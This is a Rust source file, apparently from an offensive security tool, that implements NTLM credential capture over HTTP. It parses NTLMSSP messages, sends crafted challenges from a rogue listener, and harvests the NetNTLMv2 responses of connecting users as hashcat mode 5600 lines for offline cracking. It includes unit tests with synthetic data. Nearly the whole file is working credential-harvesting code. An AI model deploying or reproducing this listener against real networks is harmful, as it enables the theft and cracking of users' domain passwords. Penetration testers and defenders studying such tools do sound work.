//! Credential capture: NTLMSSP-driven hash collection over HTTP.
//!
//! Pure parser + Type-2 builder + hashcat-5600 formatter. The HTTP
//! listener that drives the handshake comes in a follow-up task.
//!
//! See MS-NLMP for the wire format.

use crate::error::{Error, Result};

const NTLMSSP_SIG: &[u8; 8] = b"NTLMSSP\0";
const TYPE2_HEADER_LEN: usize = 56;
const TYPE3_HEADER_LEN: usize = 64;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NtlmType3 {
    pub user: String,
    pub domain: String,
    pub workstation: String,
    pub nt_response: Vec<u8>,
    pub lm_response: Vec<u8>,
}

/// Validate that `bytes` is a Type 1 `NTLMSSP` NEGOTIATE message.
/// Returns `Ok(())` on success.
pub fn parse_type1(bytes: &[u8]) -> Result<()> {
    if bytes.len() < 12 {
        return Err(Error::Credcap {
            reason: "type1 too short".into(),
        });
    }
    if bytes.get(..8) != Some(NTLMSSP_SIG.as_slice()) {
        return Err(Error::Credcap {
            reason: "type1 missing NTLMSSP signature".into(),
        });
    }
    let msg_type = read_u32_le(bytes, 8)?;
    if msg_type != 1 {
        return Err(Error::Credcap {
            reason: format!("expected type1 msg_type=1, got {msg_type}"),
        });
    }
    Ok(())
}

/// Build a Type 2 CHALLENGE response advertising `NTLMv2` with our chosen
/// 8-byte server challenge. Empty `TargetName` and `TargetInfo`.
#[must_use]
pub fn build_type2(server_challenge: [u8; 8]) -> Vec<u8> {
    const OFFSET: u32 = TYPE2_HEADER_LEN as u32;
    let mut buf = Vec::with_capacity(TYPE2_HEADER_LEN);
    buf.extend_from_slice(NTLMSSP_SIG); // 0..8
    buf.extend_from_slice(&2u32.to_le_bytes()); // 8..12  msg_type
    buf.extend_from_slice(&0u16.to_le_bytes()); // 12..14 TargetName len
    buf.extend_from_slice(&0u16.to_le_bytes()); // 14..16 TargetName max
    buf.extend_from_slice(&OFFSET.to_le_bytes()); // 16..20 TargetName offset
    let flags: u32 =
        0x0000_0001 | 0x0000_0004 | 0x0000_0200 | 0x0000_8000 | 0x0008_0000 | 0x0080_0000;
    buf.extend_from_slice(&flags.to_le_bytes()); // 20..24 NegotiateFlags
    buf.extend_from_slice(&server_challenge); // 24..32 ServerChallenge
    buf.extend_from_slice(&[0u8; 8]); // 32..40 Reserved
    buf.extend_from_slice(&0u16.to_le_bytes()); // 40..42 TargetInfo len
    buf.extend_from_slice(&0u16.to_le_bytes()); // 42..44 TargetInfo max
    buf.extend_from_slice(&OFFSET.to_le_bytes()); // 44..48 TargetInfo offset
    buf.extend_from_slice(&[0u8; 8]); // 48..56 Version (zeros)

    debug_assert_eq!(buf.len(), TYPE2_HEADER_LEN);
    buf
}

/// Parse a Type 3 `NTLMSSP` AUTHENTICATE message and extract the credentials
/// we care about (domain, user, workstation, LM response, NT response).
pub fn parse_type3(bytes: &[u8]) -> Result<NtlmType3> {
    if bytes.len() < TYPE3_HEADER_LEN {
        return Err(Error::Credcap {
            reason: "type3 too short".into(),
        });
    }
    if bytes.get(..8) != Some(NTLMSSP_SIG.as_slice()) {
        return Err(Error::Credcap {
            reason: "type3 missing NTLMSSP signature".into(),
        });
    }
    let msg_type = read_u32_le(bytes, 8)?;
    if msg_type != 3 {
        return Err(Error::Credcap {
            reason: format!("expected type3 msg_type=3, got {msg_type}"),
        });
    }

    // Field headers: each is 8 bytes (len: u16, max: u16, offset: u32).
    let lm_resp = read_field(bytes, 12)?;
    let nt_resp = read_field(bytes, 20)?;
    let domain = read_field(bytes, 28)?;
    let user = read_field(bytes, 36)?;
    let workstation = read_field(bytes, 44)?;

    Ok(NtlmType3 {
        domain: utf16le_to_string(&domain),
        user: utf16le_to_string(&user),
        workstation: utf16le_to_string(&workstation),
        nt_response: nt_resp,
        lm_response: lm_resp,
    })
}

/// Format a hashcat mode 5600 (`NetNTLMv2`) line.
///
/// Returns `None` if the NT response is shorter than 16 bytes (which
/// would mean the auth blob is not `NTLMv2` -- could be raw LM/NT v1
/// -- and we cannot crack it the same way).
#[must_use]
pub fn hashcat_5600_line(t3: &NtlmType3, server_challenge: [u8; 8]) -> Option<String> {
    if t3.nt_response.len() < 16 {
        return None;
    }
    let nt_proof_str = t3.nt_response.get(..16)?;
    let rest = t3.nt_response.get(16..)?;
    Some(format!(
        "{}::{}:{}:{}:{}",
        t3.user,
        t3.domain,
        hex(&server_challenge),
        hex(nt_proof_str),
        hex(rest)
    ))
}

fn read_u16_le(bytes: &[u8], at: usize) -> Result<u16> {
    bytes
        .get(at..at + 2)
        .and_then(|s| s.try_into().ok())
        .map(u16::from_le_bytes)
        .ok_or_else(|| Error::Credcap {
            reason: format!("u16 read out of range at offset {at}"),
        })
}

fn read_u32_le(bytes: &[u8], at: usize) -> Result<u32> {
    bytes
        .get(at..at + 4)
        .and_then(|s| s.try_into().ok())
        .map(u32::from_le_bytes)
        .ok_or_else(|| Error::Credcap {
            reason: format!("u32 read out of range at offset {at}"),
        })
}

fn read_field(bytes: &[u8], header_offset: usize) -> Result<Vec<u8>> {
    let len = usize::from(read_u16_le(bytes, header_offset)?);
    let off =
        usize::try_from(read_u32_le(bytes, header_offset + 4)?).map_err(|_| Error::Credcap {
            reason: "field offset overflow".into(),
        })?;
    bytes
        .get(off..off + len)
        .map(<[u8]>::to_vec)
        .ok_or_else(|| Error::Credcap {
            reason: format!("field at offset {off} len {len} out of range"),
        })
}

fn utf16le_to_string(bytes: &[u8]) -> String {
    let mut codepoints = Vec::with_capacity(bytes.len() / 2);
    for pair in bytes.chunks_exact(2) {
        if let Ok(arr) = <[u8; 2]>::try_from(pair) {
            codepoints.push(u16::from_le_bytes(arr));
        }
    }
    String::from_utf16_lossy(&codepoints)
}

fn hex(b: &[u8]) -> String {
    use std::fmt::Write as _;
    let mut s = String::with_capacity(b.len() * 2);
    for byte in b {
        let _ = write!(s, "{byte:02x}");
    }
    s
}

use std::future::Future;
use std::net::SocketAddr;
use std::pin::Pin;
use std::sync::Arc;

use base64::Engine as _;
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
use tokio::net::{TcpListener, TcpStream};
use tokio_util::sync::CancellationToken;

/// A boxed, heap-allocated async closure that receives a single hashcat-5600 line.
pub type HashSink = Arc<dyn Fn(String) -> Pin<Box<dyn Future<Output = ()> + Send>> + Send + Sync>;

/// HTTP listener that drives the NTLMSSP three-way handshake and captures
/// credentials via a `HashSink` callback.
pub struct HttpListener {
    listener: TcpListener,
    sink: HashSink,
}

impl HttpListener {
    /// Bind to `addr` and return an `HttpListener` that will call `sink`
    /// with each captured hashcat-5600 line.
    pub async fn bind<F, Fut>(addr: &str, sink: F) -> Result<Self>
    where
        F: Fn(String) -> Fut + Send + Sync + 'static,
        Fut: Future<Output = ()> + Send + 'static,
    {
        let listener = TcpListener::bind(addr).await.map_err(|e| Error::Credcap {
            reason: format!("bind {addr}: {e}"),
        })?;
        let sink: HashSink = Arc::new(move |s| Box::pin(sink(s)));
        Ok(Self { listener, sink })
    }

    /// Return the local address the listener is bound to.
    #[must_use]
    pub fn local_addr(&self) -> SocketAddr {
        self.listener
            .local_addr()
            .expect("HttpListener was bound but has no local address")
    }

    /// Accept connections until `cancel` is triggered.
    pub async fn run(self, cancel: CancellationToken) -> Result<()> {
        loop {
            tokio::select! {
                () = cancel.cancelled() => return Ok(()),
                r = self.listener.accept() => {
                    match r {
                        Ok((conn, _addr)) => {
                            let sink = self.sink.clone();
                            tokio::spawn(async move {
                                drop(handle_http_connection(conn, sink).await);
                            });
                        }
                        Err(e) => {
                            tracing::debug!(error = %e, "credcap accept error, continuing");
                        }
                    }
                }
            }
        }
    }
}

async fn handle_http_connection(mut conn: TcpStream, sink: HashSink) -> Result<()> {
    let mut buf = vec![0u8; 8192];
    let mut server_challenge: Option<[u8; 8]> = None;
    loop {
        let n = match conn.read(&mut buf).await {
            Ok(0) | Err(_) => return Ok(()),
            Ok(n) => n,
        };
        let req = String::from_utf8_lossy(buf.get(..n).unwrap_or_default()).to_string();
        let auth_b64 = req.lines().find_map(|l| {
            // Case-insensitive match on the header name, then take the value
            // from the *original* line (not the lowercased copy) so the base64
            // payload is not corrupted by lowercasing.
            let lower = l.to_ascii_lowercase();
            if lower.starts_with("authorization: ntlm ") {
                Some(l["authorization: ntlm ".len()..].trim().to_string())
            } else {
                None
            }
        });

        match auth_b64 {
            None => {
                drop(conn
                    .write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n")
                    .await);
            }
            Some(b64) => {
                let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(&b64) else {
                    drop(conn.write_all(b"HTTP/1.1 400 Bad Request\r\n\r\n").await);
                    return Ok(());
                };
                if raw.len() < 12 {
                    return Ok(());
                }
                let msg_type = raw
                    .get(8..12)
                    .and_then(|s| <[u8; 4]>::try_from(s).ok())
                    .map_or(0, u32::from_le_bytes);
                match msg_type {
                    1 => {
                        let challenge = next_challenge();
                        server_challenge = Some(challenge);
                        let t2 = build_type2(challenge);
                        let t2_b64 = base64::engine::general_purpose::STANDARD.encode(&t2);
                        let resp = format!(
                            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {t2_b64}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n"
                        );
                        drop(conn.write_all(resp.as_bytes()).await);
                    }
                    3 => {
                        if let Some(challenge) = server_challenge
                            && let Ok(t3) = parse_type3(&raw)
                            && let Some(line) = hashcat_5600_line(&t3, challenge)
                        {
                            tracing::info!(
                                user = %t3.user,
                                domain = %t3.domain,
                                "credcap captured"
                            );
                            (sink)(line).await;
                        }
                        drop(conn
                            .write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                            .await);
                        return Ok(());
                    }
                    _ => {
                        return Ok(());
                    }
                }
            }
        }
    }
}

fn next_challenge() -> [u8; 8] {
    use std::sync::atomic::{AtomicU64, Ordering};
    // Deterministic-but-non-trivial counter. Server challenge in our
    // capture-only scenario doesn't need cryptographic randomness; it
    // just needs to be different across handshakes so collisions don't
    // trivially confuse downstream cracking tools.
    static SEED: AtomicU64 = AtomicU64::new(0xAB54_A98C_EB1F_0AD2);
    let v = SEED.fetch_add(0x9E37_79B9_7F4A_7C15, Ordering::Relaxed);
    v.to_le_bytes()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_type1_accepts_minimal_negotiate() {
        let mut buf = Vec::new();
        buf.extend_from_slice(NTLMSSP_SIG);
        buf.extend_from_slice(&1u32.to_le_bytes());
        buf.extend_from_slice(&[0u8; 4]); // flags placeholder
        parse_type1(&buf).expect("parse");
    }

    #[test]
    fn parse_type1_rejects_wrong_msg_type() {
        let mut buf = Vec::new();
        buf.extend_from_slice(NTLMSSP_SIG);
        buf.extend_from_slice(&2u32.to_le_bytes());
        assert!(parse_type1(&buf).is_err());
    }

    #[test]
    fn build_type2_has_expected_signature_and_challenge() {
        let challenge = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11];
        let buf = build_type2(challenge);
        assert_eq!(buf.get(..8), Some(NTLMSSP_SIG.as_slice()));
        assert_eq!(read_u32_le(&buf, 8).expect("msg_type"), 2);
        assert_eq!(buf.get(24..32), Some(challenge.as_slice()));
    }

    fn synth_type3() -> Vec<u8> {
        // domain "TESTDOM", user "alice", workstation "WS"
        let domain: Vec<u8> = "TESTDOM"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        let user: Vec<u8> = "alice".encode_utf16().flat_map(u16::to_le_bytes).collect();
        let ws: Vec<u8> = "WS".encode_utf16().flat_map(u16::to_le_bytes).collect();
        let lm = vec![0u8; 24];
        let nt: Vec<u8> = (0..32).map(|_| 0xABu8).collect();

        let header_len = TYPE3_HEADER_LEN;
        let lm_off = header_len;
        let nt_off = lm_off + lm.len();
        let domain_off = nt_off + nt.len();
        let user_off = domain_off + domain.len();
        let ws_off = user_off + user.len();

        let mut buf = Vec::new();
        buf.extend_from_slice(NTLMSSP_SIG);
        buf.extend_from_slice(&3u32.to_le_bytes());

        // Five field headers in declared order (LM, NT, Domain, User, Workstation).
        for (len, off) in [
            (lm.len(), lm_off),
            (nt.len(), nt_off),
            (domain.len(), domain_off),
            (user.len(), user_off),
            (ws.len(), ws_off),
        ] {
            let l = u16::try_from(len).expect("len fits");
            let o = u32::try_from(off).expect("off fits");
            buf.extend_from_slice(&l.to_le_bytes());
            buf.extend_from_slice(&l.to_le_bytes());
            buf.extend_from_slice(&o.to_le_bytes());
        }
        // Pad header to TYPE3_HEADER_LEN. The remaining bytes (52..64)
        // would normally be EncryptedSessionKeyFields + NegotiateFlags;
        // for parser tests, zeros are fine -- we only read the five
        // field headers above.
        while buf.len() < header_len {
            buf.push(0);
        }
        buf.extend_from_slice(&lm);
        buf.extend_from_slice(&nt);
        buf.extend_from_slice(&domain);
        buf.extend_from_slice(&user);
        buf.extend_from_slice(&ws);
        buf
    }

    #[test]
    fn parse_type3_round_trips_a_synthesized_blob() {
        let buf = synth_type3();
        let parsed = parse_type3(&buf).expect("parse type3");
        assert_eq!(parsed.user, "alice");
        assert_eq!(parsed.domain, "TESTDOM");
        assert_eq!(parsed.workstation, "WS");
        assert_eq!(parsed.nt_response.len(), 32);
        assert_eq!(parsed.lm_response.len(), 24);
    }

    #[test]
    fn hashcat_5600_format_is_correct() {
        let t3 = NtlmType3 {
            user: "alice".into(),
            domain: "TESTDOM".into(),
            workstation: "WS".into(),
            lm_response: vec![0u8; 24],
            nt_response: (0..32_u8).collect(),
        };
        let challenge = [0xAA; 8];
        let line = hashcat_5600_line(&t3, challenge).expect("format");

        // Format: USER::DOMAIN:srvchallenge_hex:ntproof_hex:rest_hex
        assert!(line.starts_with("alice::TESTDOM:"));
        let suffix = &line["alice::TESTDOM:".len()..];
        let parts: Vec<&str> = suffix.split(':').collect();
        assert_eq!(
            parts.len(),
            3,
            "expected 3 colon-separated suffix parts, got {parts:?}"
        );
        let srv_hex = parts.first().expect("part 0");
        let nt_proof_hex = parts.get(1).expect("part 1");
        let rest_hex = parts.get(2).expect("part 2");
        assert_eq!(srv_hex.len(), 16, "server challenge should be 16 hex chars");
        assert_eq!(nt_proof_hex.len(), 32, "NtProofStr should be 32 hex chars");
        // rest is bytes 16..32 = 16 bytes = 32 hex chars
        assert_eq!(rest_hex.len(), 32, "rest should be 32 hex chars");
        assert!(srv_hex.chars().all(|c| c.is_ascii_hexdigit()));
        assert!(nt_proof_hex.chars().all(|c| c.is_ascii_hexdigit()));
        assert!(rest_hex.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn hashcat_5600_returns_none_for_short_nt_response() {
        let t3 = NtlmType3 {
            user: "alice".into(),
            domain: "TESTDOM".into(),
            workstation: "WS".into(),
            lm_response: vec![],
            nt_response: vec![0u8; 8],
        };
        assert!(hashcat_5600_line(&t3, [0; 8]).is_none());
    }
}
